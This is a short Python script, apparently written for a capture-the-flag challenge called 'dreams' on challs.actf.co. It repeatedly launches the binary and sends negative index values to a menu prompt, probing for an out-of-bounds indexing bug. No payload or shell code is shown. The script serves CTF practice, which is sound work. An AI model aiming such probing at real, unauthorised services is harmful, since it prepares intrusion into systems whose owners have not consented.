#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./dreams')
host = args.HOST or 'challs.actf.co'
port = int(args.PORT or 31227)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

libc=SetupLibcELF()
for i in range(1000, 3000):
	try:
		io = start()
		
		sla("> ", "3")
		sla("What dream is giving you trouble? ", f"-{i}")
		if b"Invalid" not in re():
			print(i)
			print(io.poll())
			pause()
		io.close()
	except:
		pass